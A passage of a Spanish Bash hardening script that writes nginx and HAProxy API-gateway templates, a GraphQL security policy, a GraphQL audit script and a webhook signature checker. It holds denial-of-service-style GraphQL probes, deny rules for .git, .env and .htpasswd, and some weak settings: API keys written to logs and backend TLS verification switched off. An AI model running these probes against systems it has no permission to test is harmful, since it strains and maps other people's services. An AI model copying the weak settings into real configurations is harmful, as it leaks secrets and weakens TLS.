log_section "S5: API gateway hardening (nginx/HAProxy)"

log_info "Configura hardening de API gateways:"
log_info "  - Nginx: SSL/TLS, body limits, timeouts, proxy headers, JSON logs"
log_info "  - HAProxy: health checks, connection limits, SSL offloading"
log_info "  - Templates en /etc/securizar/api-gateway/"
echo ""

if check_file_exists /etc/securizar/api-gateway/nginx-api-gateway.conf; then
    log_already "API gateway hardening (nginx-api-gateway.conf existe)"
elif ask "¿Configurar hardening de API gateway?"; then

    mkdir -p /etc/securizar/api-gateway

    # ── Nginx API Gateway template ───────────────────────────
    NGINX_GW="/etc/securizar/api-gateway/nginx-api-gateway.conf"
    if [[ -f "$NGINX_GW" ]]; then
        cp -a "$NGINX_GW" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$NGINX_GW" << 'EOF'
# ============================================================
# nginx-api-gateway.conf - API Gateway hardening template
# Generado por securizar - Modulo 63
# ============================================================
# Copiar a /etc/nginx/sites-available/ y adaptar
# ============================================================

# ── Upstream API backends ────────────────────────────────────
upstream api_backend {
    least_conn;
    keepalive 32;

    server 127.0.0.1:8080 weight=5 max_fails=3 fail_timeout=30s;
    server 127.0.0.1:8081 weight=5 max_fails=3 fail_timeout=30s;
    # server 127.0.0.1:8082 backup;
}

# ── JSON log format para APIs ────────────────────────────────
log_format api_json escape=json
    '{'
        '"time":"$time_iso8601",'
        '"remote_addr":"$remote_addr",'
        '"request_method":"$request_method",'
        '"request_uri":"$request_uri",'
        '"status":$status,'
        '"body_bytes_sent":$body_bytes_sent,'
        '"request_time":$request_time,'
        '"upstream_response_time":"$upstream_response_time",'
        '"http_user_agent":"$http_user_agent",'
        '"http_x_forwarded_for":"$http_x_forwarded_for",'
        '"http_x_api_key":"$http_x_api_key",'
        '"request_id":"$request_id",'
        '"ssl_protocol":"$ssl_protocol",'
        '"ssl_cipher":"$ssl_cipher",'
        '"upstream_addr":"$upstream_addr",'
        '"upstream_status":"$upstream_status"'
    '}';

# ── Server block ─────────────────────────────────────────────
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name api.example.com;

    # ── SSL/TLS ──────────────────────────────────────────────
    ssl_certificate /etc/ssl/certs/api.example.com.crt;
    ssl_certificate_key /etc/ssl/private/api.example.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20POLY1305:!aNULL:!MD5:!DSS:!3DES:!RC4';
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:API_SSL:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets off;
    ssl_stapling on;
    ssl_stapling_verify on;

    # ── Logging ──────────────────────────────────────────────
    access_log /var/log/nginx/api-access.json api_json;
    error_log /var/log/nginx/api-error.log warn;

    # ── Request limits ───────────────────────────────────────
    client_max_body_size 10m;
    client_body_buffer_size 16k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;

    # ── Timeouts ─────────────────────────────────────────────
    client_body_timeout 15s;
    client_header_timeout 15s;
    send_timeout 15s;
    keepalive_timeout 30s;

    # ── Proxy timeouts ───────────────────────────────────────
    proxy_connect_timeout 10s;
    proxy_send_timeout 30s;
    proxy_read_timeout 30s;

    # ── Security headers (global) ────────────────────────────
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy "default-src 'none'; frame-ancestors 'none'" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;

    # ── Ocultar info del servidor ────────────────────────────
    server_tokens off;
    proxy_hide_header X-Powered-By;
    proxy_hide_header Server;

    # ── Health check endpoint ────────────────────────────────
    location = /health {
        access_log off;
        return 200 '{"status":"healthy"}';
        add_header Content-Type application/json;
    }

    # ── API v1 ───────────────────────────────────────────────
    location /api/v1/ {
        # Rate limiting
        limit_req zone=api_global burst=50 nodelay;
        limit_conn api_conn 20;

        # Proxy settings
        proxy_pass http://api_backend;
        proxy_http_version 1.1;
        proxy_set_header Connection "";

        # Sanitizar proxy headers
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Request-ID $request_id;

        # Eliminar headers internos del cliente
        proxy_set_header X-Internal-Auth "";
        proxy_set_header X-Debug "";

        # Buffering
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;

        # Request ID en respuesta
        add_header X-Request-ID $request_id always;
    }

    # ── Auth endpoints (rate limit estricto) ─────────────────
    location /api/v1/auth/ {
        limit_req zone=api_auth burst=10 nodelay;

        proxy_pass http://api_backend;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Request-ID $request_id;
    }

    # ── Bloquear rutas internas ──────────────────────────────
    location ~ ^/(internal|admin|debug|actuator|metrics) {
        return 403;
    }

    # ── Bloquear archivos sensibles ──────────────────────────
    location ~ /\.(git|env|htaccess|htpasswd|svn) {
        return 403;
    }

    # ── Metodos HTTP permitidos ──────────────────────────────
    if ($request_method !~ ^(GET|POST|PUT|PATCH|DELETE|OPTIONS|HEAD)$) {
        return 405;
    }

    # ── Redirect HTTP a HTTPS ────────────────────────────────
    error_page 497 =301 https://$host$request_uri;
}

# ── HTTP redirect ────────────────────────────────────────────
server {
    listen 80;
    listen [::]:80;
    server_name api.example.com;
    return 301 https://$host$request_uri;
}
EOF
    log_change "Creado" "$NGINX_GW"

    # ── HAProxy API Gateway template ─────────────────────────
    HAPROXY_GW="/etc/securizar/api-gateway/haproxy-api-gateway.cfg"
    if [[ -f "$HAPROXY_GW" ]]; then
        cp -a "$HAPROXY_GW" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$HAPROXY_GW" << 'EOF'
# ============================================================
# haproxy-api-gateway.cfg - API Gateway hardening (HAProxy)
# Generado por securizar - Modulo 63
# ============================================================
# Copiar a /etc/haproxy/haproxy.cfg y adaptar
# ============================================================

global
    log /dev/log local0
    log /dev/log local1 notice
    chroot /var/lib/haproxy
    stats socket /run/haproxy/admin.sock mode 660 level admin
    stats timeout 30s
    user haproxy
    group haproxy
    daemon

    # SSL hardening
    ssl-default-bind-ciphers ECDHE+AESGCM:ECDHE+CHACHA20POLY1305:!aNULL:!MD5:!3DES:!RC4
    ssl-default-bind-ciphersuites TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets
    ssl-default-server-ciphers ECDHE+AESGCM:ECDHE+CHACHA20POLY1305:!aNULL:!MD5
    ssl-default-server-options ssl-min-ver TLSv1.2 no-tls-tickets

    # Tuning
    maxconn 10000
    tune.ssl.default-dh-param 4096

defaults
    log     global
    mode    http
    option  httplog
    option  dontlognull
    option  forwardfor
    option  http-server-close
    timeout connect 5s
    timeout client  30s
    timeout server  30s
    timeout http-request 10s
    timeout http-keep-alive 10s
    timeout queue 30s
    errorfile 400 /etc/haproxy/errors/400.http
    errorfile 403 /etc/haproxy/errors/403.http
    errorfile 429 /etc/haproxy/errors/429.http
    errorfile 500 /etc/haproxy/errors/500.http
    errorfile 502 /etc/haproxy/errors/502.http
    errorfile 503 /etc/haproxy/errors/503.http

# ── Frontend ─────────────────────────────────────────────────
frontend api_https
    bind *:443 ssl crt /etc/haproxy/certs/api.pem alpn h2,http/1.1
    bind *:80
    redirect scheme https code 301 if !{ ssl_fc }

    # Rate limiting stick-tables
    stick-table type ip size 200k expire 30s store http_req_rate(10s),conn_cur,gpc0
    http-request track-sc0 src

    # Global rate limit: 100 req/10s per IP
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 100 }
    # Connection limit: 20 per IP
    http-request deny deny_status 429 if { sc_conn_cur(0) gt 20 }

    # Security headers
    http-response set-header X-Content-Type-Options nosniff
    http-response set-header X-Frame-Options DENY
    http-response set-header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    http-response set-header Referrer-Policy strict-origin-when-cross-origin
    http-response set-header Content-Security-Policy "default-src 'none'; frame-ancestors 'none'"
    http-response del-header X-Powered-By
    http-response del-header Server

    # Request ID
    unique-id-format %{+X}o\ %ci:%cp_%fi:%fp_%Ts_%rt:%pid
    unique-id-header X-Request-ID

    # ACLs
    acl is_api path_beg /api/
    acl is_health path /health
    acl is_auth path_beg /api/auth/

    # Block internal paths
    acl is_internal path_beg /internal /admin /debug /actuator
    http-request deny if is_internal

    # Routing
    use_backend api_servers if is_api
    use_backend health_check if is_health
    default_backend api_servers

# ── Backend API ──────────────────────────────────────────────
backend api_servers
    mode http
    balance roundrobin
    option httpchk GET /health
    http-check expect status 200

    # Connection limits per server
    default-server maxconn 500 inter 5s fall 3 rise 2

    server api1 127.0.0.1:8080 check ssl verify none
    server api2 127.0.0.1:8081 check ssl verify none

# ── Backend Health ───────────────────────────────────────────
backend health_check
    mode http
    http-request return status 200 content-type application/json lf-string '{"status":"healthy"}'

# ── Stats (solo acceso local) ────────────────────────────────
frontend stats
    bind 127.0.0.1:8404
    stats enable
    stats uri /stats
    stats refresh 10s
    stats admin if LOCALHOST
EOF
    log_change "Creado" "$HAPROXY_GW"

    # ── HAProxy 429 error page ───────────────────────────────
    if [[ "$HAPROXY_INSTALLED" == true ]]; then
        mkdir -p /etc/haproxy/errors 2>/dev/null || true
        if [[ -d /etc/haproxy/errors ]]; then
            cat > /etc/haproxy/errors/429.http << 'EOF'
HTTP/1.0 429 Too Many Requests
Content-Type: application/json
Retry-After: 60
Connection: close

{"error":"rate_limit_exceeded","message":"Too many requests. Please retry later.","retry_after":60}
EOF
            log_change "Creado" "/etc/haproxy/errors/429.http"
        fi
    fi

    log_info "API gateway hardening configurado"
    log_info "Templates en /etc/securizar/api-gateway/"
else
    log_skip "API gateway hardening"
fi

# ============================================================
# S6: GRAPHQL SECURITY
# ============================================================
log_section "S6: GraphQL security"

log_info "Configura seguridad para APIs GraphQL:"
log_info "  - Deshabilitar introspection en produccion"
log_info "  - Query depth limiting"
log_info "  - Query complexity analysis"
log_info "  - Persisted queries enforcement"
log_info "  - Script de auditoria GraphQL"
echo ""

if check_file_exists /usr/local/bin/auditar-graphql.sh; then
    log_already "GraphQL security (auditar-graphql.sh existe)"
elif ask "¿Configurar seguridad GraphQL?"; then

    # ── Politica GraphQL ─────────────────────────────────────
    GQL_POLICY="/etc/securizar/graphql-policy.conf"
    if [[ -f "$GQL_POLICY" ]]; then
        cp -a "$GQL_POLICY" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$GQL_POLICY" << 'EOF'
# ============================================================
# graphql-policy.conf - Politica de seguridad GraphQL
# Generado por securizar - Modulo 63
# ============================================================

# ── Introspection ────────────────────────────────────────────
GRAPHQL_DISABLE_INTROSPECTION=true
GRAPHQL_ALLOW_INTROSPECTION_IPS="127.0.0.1,::1"

# ── Query Limits ─────────────────────────────────────────────
GRAPHQL_MAX_DEPTH=10
GRAPHQL_MAX_COMPLEXITY=1000
GRAPHQL_MAX_ALIASES=10
GRAPHQL_MAX_ROOT_FIELDS=10
GRAPHQL_MAX_DIRECTIVES=50

# ── Persisted Queries ────────────────────────────────────────
GRAPHQL_REQUIRE_PERSISTED_QUERIES=false
GRAPHQL_PERSISTED_QUERIES_DIR="/etc/securizar/graphql-queries/"

# ── Timeouts ─────────────────────────────────────────────────
GRAPHQL_QUERY_TIMEOUT_SECONDS=30
GRAPHQL_MAX_BATCH_SIZE=10

# ── Batching ─────────────────────────────────────────────────
GRAPHQL_ALLOW_BATCHING=true
GRAPHQL_MAX_BATCH_OPERATIONS=5

# ── Cost Analysis ────────────────────────────────────────────
GRAPHQL_ENABLE_COST_ANALYSIS=true
GRAPHQL_MAX_COST=500
GRAPHQL_DEFAULT_FIELD_COST=1
GRAPHQL_DEFAULT_LIST_COST=10

# ── Logging ──────────────────────────────────────────────────
GRAPHQL_LOG_QUERIES=true
GRAPHQL_LOG_ERRORS=true
GRAPHQL_LOG_SLOW_QUERIES=true
GRAPHQL_SLOW_QUERY_THRESHOLD_MS=1000
EOF
    log_change "Creado" "$GQL_POLICY"

    # ── Nginx GraphQL protection snippet ─────────────────────
    if [[ "$NGINX_INSTALLED" == true ]]; then
        mkdir -p "$NGINX_CONF_DIR/snippets"

        cat > "$NGINX_CONF_DIR/snippets/securizar-graphql.conf" << 'EOF'
# ============================================================
# securizar-graphql.conf - GraphQL protection (nginx)
# Generado por securizar - Modulo 63
# Incluir dentro de location /graphql { }
# ============================================================

# Solo permitir POST para queries GraphQL
limit_except POST {
    deny all;
}

# Rate limiting para GraphQL
limit_req zone=api_global burst=30 nodelay;

# Limitar tamano de query
client_max_body_size 100k;
client_body_buffer_size 100k;

# Proxy settings
proxy_pass http://api_backend;
proxy_http_version 1.1;
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;
proxy_set_header X-Request-ID $request_id;

# Timeout para queries complejas
proxy_read_timeout 30s;
proxy_send_timeout 30s;
EOF
        log_change "Creado" "$NGINX_CONF_DIR/snippets/securizar-graphql.conf"
    fi

    # ── Script de auditoria GraphQL ──────────────────────────
    GQL_AUDIT="/usr/local/bin/auditar-graphql.sh"
    if [[ -f "$GQL_AUDIT" ]]; then
        cp -a "$GQL_AUDIT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$GQL_AUDIT" << 'EOFGQLAUDIT'
#!/bin/bash
# ============================================================
# auditar-graphql.sh - Auditoria de seguridad GraphQL
# Generado por securizar - Modulo 63
# ============================================================
# Uso: auditar-graphql.sh URL [--introspection] [--depth] [--all]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

URL="${1:-}"
CHECK_TYPE="${2:---all}"
ISSUES=0; PASSED=0; WARNINGS=0

if [[ -z "$URL" ]]; then
    echo "Uso: $0 URL [--introspection|--depth|--batch|--all]"
    exit 1
fi

if ! command -v curl &>/dev/null; then
    echo -e "${RED}Error: curl necesario${NC}"
    exit 1
fi

echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "${BOLD}  AUDITORIA DE SEGURIDAD GRAPHQL${NC}"
echo -e "${BOLD}══════════════════════════════════════════${NC}"
echo -e "  Target: ${URL}"
echo ""

pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; ((PASSED++)) || true; }
warn() { echo -e "  ${YELLOW}[WARN]${NC} $1"; ((WARNINGS++)) || true; }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; ((ISSUES++)) || true; }

# ── Test Introspection ───────────────────────────────────────
test_introspection() {
    echo -e "${CYAN}── Introspection Test ──${NC}"

    local query='{"query":"{ __schema { types { name } } }"}'
    local response
    response=$(curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d "$query" "$URL" 2>/dev/null || echo "")

    if echo "$response" | grep -q "__schema" 2>/dev/null; then
        fail "Introspection habilitada - expone esquema completo"
        local type_count
        type_count=$(echo "$response" | grep -oP '"name"\s*:\s*"[^"]+"' | wc -l || echo "?")
        echo -e "    ${RED}Tipos expuestos: $type_count${NC}"
    else
        pass "Introspection deshabilitada o bloqueada"
    fi

    # Test __type
    local type_query='{"query":"{ __type(name: \"Query\") { name fields { name } } }"}'
    local type_response
    type_response=$(curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d "$type_query" "$URL" 2>/dev/null || echo "")

    if echo "$type_response" | grep -q '"fields"' 2>/dev/null; then
        fail "__type query accesible - expone tipos individuales"
    else
        pass "__type query bloqueada"
    fi
}

# ── Test Query Depth ─────────────────────────────────────────
test_depth() {
    echo -e "${CYAN}── Query Depth Test ──${NC}"

    # Query con profundidad excesiva (10 niveles)
    local deep_query='{"query":"{ user { posts { comments { author { posts { comments { author { posts { comments { author { name } } } } } } } } } } }"}'
    local response
    response=$(curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d "$deep_query" "$URL" 2>/dev/null || echo "")

    if echo "$response" | grep -qi "error\|depth\|too deep\|exceeded" 2>/dev/null; then
        pass "Query depth limiting activo"
    elif echo "$response" | grep -q '"data"' 2>/dev/null; then
        warn "Query profunda (10 niveles) aceptada - verificar depth limiting"
    else
        pass "Query profunda rechazada o sin datos"
    fi
}

# ── Test Batching ────────────────────────────────────────────
test_batching() {
    echo -e "${CYAN}── Batch Query Test ──${NC}"

    # Enviar batch de 20 queries
    local batch='['
    for i in $(seq 1 20); do
        [[ $i -gt 1 ]] && batch+=','
        batch+='{"query":"{ __typename }"}'
    done
    batch+=']'

    local response
    response=$(curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d "$batch" "$URL" 2>/dev/null || echo "")

    if echo "$response" | grep -qi "error\|batch.*limit\|too many" 2>/dev/null; then
        pass "Batch limiting activo"
    elif echo "$response" | grep -q '\[' 2>/dev/null; then
        local result_count
        result_count=$(echo "$response" | grep -oP '"__typename"' | wc -l || echo "0")
        if [[ "$result_count" -ge 20 ]]; then
            warn "Batch de 20 queries aceptado sin limite"
        else
            pass "Batch parcialmente limitado ($result_count respuestas)"
        fi
    else
        pass "Batch query rechazado"
    fi
}

# ── Test Alias Abuse ─────────────────────────────────────────
test_aliases() {
    echo -e "${CYAN}── Alias Abuse Test ──${NC}"

    local alias_query='{"query":"{ a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename a7:__typename a8:__typename a9:__typename a10:__typename a11:__typename a12:__typename a13:__typename a14:__typename a15:__typename a16:__typename a17:__typename a18:__typename a19:__typename a20:__typename }"}'
    local response
    response=$(curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d "$alias_query" "$URL" 2>/dev/null || echo "")

    if echo "$response" | grep -qi "error\|alias.*limit\|too many" 2>/dev/null; then
        pass "Alias limiting activo"
    elif echo "$response" | grep -q '"a20"' 2>/dev/null; then
        warn "20 aliases aceptados sin limite - riesgo de DoS"
    else
        pass "Alias query manejado correctamente"
    fi
}

# ── Test HTTP Methods ────────────────────────────────────────
test_methods() {
    echo -e "${CYAN}── HTTP Methods Test ──${NC}"

    # GET deberia estar deshabilitado o limitado para GraphQL
    local get_status
    get_status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${URL}?query={__typename}" 2>/dev/null || echo "000")
    if [[ "$get_status" == "405" || "$get_status" == "400" ]]; then
        pass "GET queries bloqueadas (HTTP $get_status)"
    elif [[ "$get_status" == "200" ]]; then
        warn "GET queries habilitadas - riesgo de caching de queries sensibles"
    else
        pass "GET: HTTP $get_status"
    fi
}

case "$CHECK_TYPE" in
    --introspection) test_introspection ;;
    --depth)         test_depth ;;
    --batch)         test_batching ;;
    --aliases)       test_aliases ;;
    --methods)       test_methods ;;
    --all)
        test_introspection; echo ""
        test_depth; echo ""
        test_batching; echo ""
        test_aliases; echo ""
        test_methods
        ;;
    *) echo "Tipo no valido: $CHECK_TYPE"; exit 1 ;;
esac

echo ""
echo -e "${BOLD}── Resumen ──${NC}"
echo -e "  ${GREEN}Pasados: $PASSED${NC}"
echo -e "  ${YELLOW}Avisos:  $WARNINGS${NC}"
echo -e "  ${RED}Fallos:  $ISSUES${NC}"

[[ $ISSUES -gt 0 ]] && exit 1 || exit 0
EOFGQLAUDIT
    chmod +x "$GQL_AUDIT"
    log_change "Creado" "$GQL_AUDIT"
    log_change "Permisos" "$GQL_AUDIT -> +x"

    log_info "Seguridad GraphQL configurada"
    log_info "Ejecuta: auditar-graphql.sh URL --all"
else
    log_skip "GraphQL security"
fi

# ============================================================
# S7: WEBHOOK SIGNATURE VERIFICATION
# ============================================================
log_section "S7: Webhook signature verification"

log_info "Configura verificacion de firmas de webhooks:"
log_info "  - HMAC-SHA256 signature validation"
log_info "  - Timestamp validation (anti-replay)"
log_info "  - IP whitelist para webhook sources"
log_info "  - Ejemplos para GitHub, Stripe, Slack"
echo ""

if check_file_exists /usr/local/bin/verificar-webhooks.sh; then
    log_already "Webhook signature verification (verificar-webhooks.sh existe)"
elif ask "¿Configurar verificacion de webhooks?"; then

    # ── Script de verificacion de webhooks ────────────────────
    WEBHOOK_SCRIPT="/usr/local/bin/verificar-webhooks.sh"
    if [[ -f "$WEBHOOK_SCRIPT" ]]; then
        cp -a "$WEBHOOK_SCRIPT" "$BACKUP_DIR/" 2>/dev/null || true
    fi

    cat > "$WEBHOOK_SCRIPT" << 'EOFWEBHOOK'
#!/bin/bash
# ============================================================
# verificar-webhooks.sh - Verificacion de firmas de webhooks
# Generado por securizar - Modulo 63
# ============================================================
# Uso: verificar-webhooks.sh {verify|test|setup|ip-check} [args]
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

SECRETS_DIR="/etc/securizar/webhook-secrets"
WHITELIST_FILE="/etc/securizar/webhook-ip-whitelist.conf"
ACTION="${1:-help}"

# ── Verificar HMAC-SHA256 ────────────────────────────────────
verify_hmac_sha256() {
    local secret="$1"
    local payload="$2"
    local received_sig="$3"

    local computed_sig
    computed_sig=$(echo -n "$payload" | openssl dgst -sha256 -hmac "$secret" | awk '{print $2}')

    if [[ "sha256=$computed_sig" == "$received_sig" ]] || [[ "$computed_sig" == "$received_sig" ]]; then
        echo -e "${GREEN}[VALID]${NC} Firma HMAC-SHA256 verificada"
        return 0
    else
        echo -e "${RED}[INVALID]${NC} Firma no coincide"
        echo -e "  Esperada:  ${computed_sig}"
        echo -e "  Recibida:  ${received_sig}"
        return 1
    fi
}

# ── Verificar timestamp (anti-replay) ────────────────────────
verify_timestamp() {
    local timestamp="$1"
    local tolerance="${2:-300}"

    local now
    now=$(date +%s)
    local diff=$((now - timestamp))

    if [[ $diff -lt 0 ]]; then
        diff=$((-diff))
    fi

    if [[ $diff -le $tolerance ]]; then
        echo -e "${GREEN}[VALID]${NC} Timestamp dentro de tolerancia (${diff}s <= ${tolerance}s)"
        return 0
    else
        echo -e "${RED}[EXPIRED]${NC} Timestamp fuera de tolerancia (${diff}s > ${tolerance}s)"
        return 1
    fi
}

# ── Verificar IP en whitelist ────────────────────────────────
verify_ip() {
    local ip="$1"
    local provider="${2:-generic}"

    if [[ ! -f "$WHITELIST_FILE" ]]; then
        echo -e "${YELLOW}[WARN]${NC} Whitelist no encontrada: $WHITELIST_FILE"
        return 1
    fi

    if grep -q "^${ip}$" "$WHITELIST_FILE" 2>/dev/null || grep -q "^${provider}:${ip}$" "$WHITELIST_FILE" 2>/dev/null; then
        echo -e "${GREEN}[VALID]${NC} IP $ip en whitelist ($provider)"
        return 0
    else
        echo -e "${RED}[BLOCKED]${NC} IP $ip no en whitelist ($provider)"
        return 1
    fi
}

# ── Verificar webhook GitHub ─────────────────────────────────
verify_github() {
    local payload="$1"
    local signature="$2"

    local secret_file="${SECRETS_DIR}/github.secret"
    if [[ ! -f "$secret_file" ]]; then
        echo -e "${RED}Error: Secret de GitHub no configurado${NC}"
        echo "Ejecuta: $0 setup github SECRET"
        return 1
    fi

    local secret
    secret=$(cat "$secret_file")
    local computed
    computed=$(echo -n "$payload" | openssl dgst -sha256 -hmac "$secret" | awk '{print $2}')

    if [[ "sha256=$computed" == "$signature" ]]; then
        echo -e "${GREEN}[VALID]${NC} Webhook de GitHub verificado"
        return 0
    else
        echo -e "${RED}[INVALID]${NC} Firma de GitHub no valida"
        return 1
    fi
}

# ── Verificar webhook Stripe ─────────────────────────────────
verify_stripe() {
    local payload="$1"
    local signature_header="$2"

    local secret_file="${SECRETS_DIR}/stripe.secret"
    if [[ ! -f "$secret_file" ]]; then
        echo -e "${RED}Error: Secret de Stripe no configurado${NC}"
        echo "Ejecuta: $0 setup stripe SECRET"
        return 1
    fi

    local secret
    secret=$(cat "$secret_file")

    # Extraer timestamp y firma del header Stripe
    local timestamp
    timestamp=$(echo "$signature_header" | grep -oP 't=\K[0-9]+' || echo "0")
    local sig_v1
    sig_v1=$(echo "$signature_header" | grep -oP 'v1=\K[a-f0-9]+' || echo "")

    if [[ -z "$sig_v1" ]]; then
        echo -e "${RED}[INVALID]${NC} Header de firma Stripe malformado"
        return 1
    fi

    # Verificar timestamp
    verify_timestamp "$timestamp" 300 || return 1

    # Computar firma esperada
    local signed_payload="${timestamp}.${payload}"
    local computed
    computed=$(echo -n "$signed_payload" | openssl dgst -sha256 -hmac "$secret" | awk '{print $2}')

    if [[ "$computed" == "$sig_v1" ]]; then
        echo -e "${GREEN}[VALID]${NC} Webhook de Stripe verificado"
        return 0
    else
        echo -e "${RED}[INVALID]${NC} Firma de Stripe no valida"
        return 1
    fi
}

# ── Verificar webhook Slack ──────────────────────────────────
verify_slack() {
    local payload="$1"
    local timestamp="$2"
    local signature="$3"

    local secret_file="${SECRETS_DIR}/slack.secret"
    if [[ ! -f "$secret_file" ]]; then
        echo -e "${RED}Error: Secret de Slack no configurado${NC}"
        echo "Ejecuta: $0 setup slack SECRET"
        return 1
    fi

    local secret
    secret=$(cat "$secret_file")

    # Verificar timestamp
    verify_timestamp "$timestamp" 300 || return 1

    # Computar firma
    local basestring="v0:${timestamp}:${payload}"
    local computed
    computed=$(echo -n "$basestring" | openssl dgst -sha256 -hmac "$secret" | awk '{print $2}')

    if [[ "v0=$computed" == "$signature" ]]; then
        echo -e "${GREEN}[VALID]${NC} Webhook de Slack verificado"
        return 0
    else
        echo -e "${RED}[INVALID]${NC} Firma de Slack no valida"
        return 1
    fi
}

# ── Setup ────────────────────────────────────────────────────
setup_provider() {
    local provider="${2:-}"
    local secret="${3:-}"

    if [[ -z "$provider" || -z "$secret" ]]; then
        echo "Uso: $0 setup {github|stripe|slack|custom} SECRET"
        exit 1
    fi

    mkdir -p "$SECRETS_DIR"
    chmod 700 "$SECRETS_DIR"

    echo -n "$secret" > "${SECRETS_DIR}/${provider}.secret"
    chmod 600 "${SECRETS_DIR}/${provider}.secret"
    echo -e "${GREEN}Secret para $provider configurado${NC}"
}

# ── Test ─────────────────────────────────────────────────────
run_test() {
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}  TEST DE VERIFICACION DE WEBHOOKS${NC}"
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo ""

    # Test HMAC-SHA256
    echo -e "${CYAN}── Test HMAC-SHA256 ──${NC}"
    local test_secret="test-secret-key-12345"
    local test_payload='{"event":"test","data":{"id":1}}'
    local test_sig
    test_sig="sha256=$(echo -n "$test_payload" | openssl dgst -sha256 -hmac "$test_secret" | awk '{print $2}')"

    echo "  Secret: $test_secret"
    echo "  Payload: $test_payload"
    echo "  Firma: $test_sig"
    verify_hmac_sha256 "$test_secret" "$test_payload" "$test_sig"

    echo ""
    echo -e "${CYAN}── Test firma invalida ──${NC}"
    verify_hmac_sha256 "$test_secret" "$test_payload" "sha256=invalid_signature_here" || true

    echo ""
    echo -e "${CYAN}── Test timestamp ──${NC}"
    local now
    now=$(date +%s)
    verify_timestamp "$now" 300
    echo ""
    local old=$((now - 600))
    verify_timestamp "$old" 300 || true
}

# ── IP Check ────────────────────────────────────────────────
ip_check() {
    local provider="${2:-}"
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}  WEBHOOK IP RANGES${NC}"
    echo -e "${BOLD}══════════════════════════════════════════${NC}"
    echo ""

    if [[ -f "$WHITELIST_FILE" ]]; then
        echo -e "${CYAN}── IPs en whitelist ──${NC}"
        cat "$WHITELIST_FILE"
    else
        echo -e "${YELLOW}No hay whitelist configurada${NC}"
        echo -e "Creando whitelist base..."

        mkdir -p "$(dirname "$WHITELIST_FILE")"
        cat > "$WHITELIST_FILE" << 'EOFWL'
# ============================================================
# webhook-ip-whitelist.conf - IPs permitidas para webhooks
# Generado por securizar - Modulo 63
# ============================================================
# Formato: IP o provider:IP
# GitHub webhook IPs (verificar en https://api.github.com/meta)
# Stripe webhook IPs (verificar en docs de Stripe)
# ============================================================

# Localhost
127.0.0.1
::1

# GitHub (ejemplo - verificar IPs actuales)
# github:140.82.112.0/20
# github:185.199.108.0/22
# github:192.30.252.0/22

# Stripe (ejemplo - verificar IPs actuales)
# stripe:54.187.174.169
# stripe:54.187.205.235
# stripe:54.187.216.72

# Slack (ejemplo)
# slack:34.226.99.0/24
EOFWL
        echo -e "${GREEN}Whitelist creada: $WHITELIST_FILE${NC}"
    fi
}

# ── Help ─────────────────────────────────────────────────────
show_help() {
    echo "Uso: $0 {verify|test|setup|ip-check|help}"
    echo ""
    echo "Comandos:"
    echo "  verify github PAYLOAD SIGNATURE      Verificar webhook GitHub"
    echo "  verify stripe PAYLOAD SIG_HEADER      Verificar webhook Stripe"
    echo "  verify slack PAYLOAD TIMESTAMP SIG    Verificar webhook Slack"
    echo "  verify hmac SECRET PAYLOAD SIGNATURE  Verificar HMAC generico"
    echo "  test                                  Ejecutar tests de verificacion"
    echo "  setup PROVIDER SECRET                 Configurar secret de provider"
    echo "  ip-check                              Gestionar IP whitelist"
    echo ""
}

case "$ACTION" in
    verify)
        provider="${2:-}"
        case "$provider" in
            github) verify_github "${3:-}" "${4:-}" ;;
            stripe) verify_stripe "${3:-}" "${4:-}" ;;
            slack)  verify_slack "${3:-}" "${4:-}" "${5:-}" ;;
            hmac)   verify_hmac_sha256 "${3:-}" "${4:-}" "${5:-}" ;;
